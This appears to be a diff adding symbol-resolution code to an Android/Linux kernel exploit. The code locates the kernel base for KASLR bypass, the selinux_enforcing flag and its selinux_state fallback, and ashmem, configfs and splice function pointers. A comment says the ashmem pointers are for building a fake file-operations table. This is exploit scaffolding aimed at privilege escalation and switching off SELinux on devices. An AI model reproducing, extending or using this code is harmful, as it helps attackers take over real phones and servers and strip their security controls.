@@ -185,6 +185,54 @@ int robustness_check_phase1(robustness_result_t *result) {
     result->dyn_nfulnl_logger = kallsyms_resolve("nfulnl_logger");
     result->dyn_loggers = kallsyms_resolve("loggers");
 
+    /* KASLR base: 优先 _stext，回退 __init_begin 或 _text */
+    result->dyn_stext = kallsyms_resolve("_stext");
+    if (!result->dyn_stext) {
+      result->dyn_stext = kallsyms_resolve("__init_begin");
+    }
+    if (!result->dyn_stext) {
+      result->dyn_stext = kallsyms_resolve("_text");
+    }
+    if (result->dyn_stext) {
+      pr_success("robustness: stext found at 0x%llx\n",
+                 (unsigned long long)result->dyn_stext);
+    }
+
+    /* root_task_group */
+    result->dyn_root_task_group = kallsyms_resolve("root_task_group");
+
+    /* selinux_enforcing: 4.19 用独立全局变量，5.7+ 用 selinux_state.enforcing(偏移0) */
+    result->dyn_selinux_enforcing = kallsyms_resolve("selinux_enforcing");
+    if (!result->dyn_selinux_enforcing) {
+      result->dyn_selinux_enforcing = result->dyn_selinux_state;
+    }
+    if (result->dyn_selinux_enforcing) {
+      pr_success("robustness: selinux_enforcing at 0x%llx\n",
+                 (unsigned long long)result->dyn_selinux_enforcing);
+    }
+
+    /* fops 函数指针 (用于 put_fake_fops_table) */
+    result->dyn_ashmem_ioctl = kallsyms_resolve("ashmem_ioctl");
+    result->dyn_ashmem_compat_ioctl = kallsyms_resolve("ashmem_compat_ioctl");
+    result->dyn_ashmem_mmap = kallsyms_resolve("ashmem_mmap");
+    result->dyn_ashmem_open = kallsyms_resolve("ashmem_open");
+    result->dyn_ashmem_release = kallsyms_resolve("ashmem_release");
+    result->dyn_ashmem_show_fdinfo = kallsyms_resolve("ashmem_show_fdinfo");
+
+    /* configfs 函数指针 */
+    result->dyn_configfs_read_iter = kallsyms_resolve("configfs_bin_read_iter");
+    if (!result->dyn_configfs_read_iter) {
+      result->dyn_configfs_read_iter = kallsyms_resolve("configfs_read_iter");
+    }
+    result->dyn_configfs_bin_write_iter = kallsyms_resolve("configfs_bin_write_iter");
+
+    /* 通用函数指针 */
+    result->dyn_copy_splice_read = kallsyms_resolve("copy_page_to_iter_splice");
+    if (!result->dyn_copy_splice_read) {
+      result->dyn_copy_splice_read = kallsyms_resolve("copy_splice_read");
+    }
+    result->dyn_noop_llseek = kallsyms_resolve("noop_llseek");
+
     int resolved_count = 0;
     if (result->dyn_ashmem_fops) resolved_count++;
     if (result->dyn_init_task) resolved_count++;
